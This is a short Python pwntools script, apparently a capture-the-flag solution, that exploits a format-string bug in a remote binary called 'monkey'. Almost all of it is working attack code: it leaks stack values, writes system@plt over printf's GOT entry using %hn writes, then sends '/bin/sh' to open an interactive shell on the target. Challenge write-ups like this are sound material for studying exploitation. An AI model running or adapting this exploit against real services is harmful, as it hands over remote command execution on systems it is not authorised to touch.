from pwn import *

ip = "bamboofox.cs.nctu.edu.tw"
port = 11000
r = remote(ip,port)

elf = 'monkey' 
#r = process("./"+elf)

context.arch = 'i386'

offset = 7

printf_got = 0x804a00c


system_plt = 0x80485c6
# 0x0804 85c6
# 0x0804 = 2052
# 0x85c6 = 34246
# 32194

#exploit = "%19$p".ljust( 0x30 , 'a' )+p32(0xdeadbeef)
get_addr = "%269$p"
# 0x30 = 48 
# 32bit => 48/4= 12  7+12=19

raw_input("AAAA")

r.recvuntil("choice!\n")
r.sendline("2")
r.recvuntil("out.\n")
exploit = "%2052c%19$hn%32194c%20$hn".ljust( 0x30 , 'a' )+p32(printf_got+2)+p32(printf_got)
r.sendline(exploit)
r.recvuntil("choice!\n")
r.sendline("2")
r.recvuntil("out.\n")
r.sendline("/bin/sh")
r.interactive()
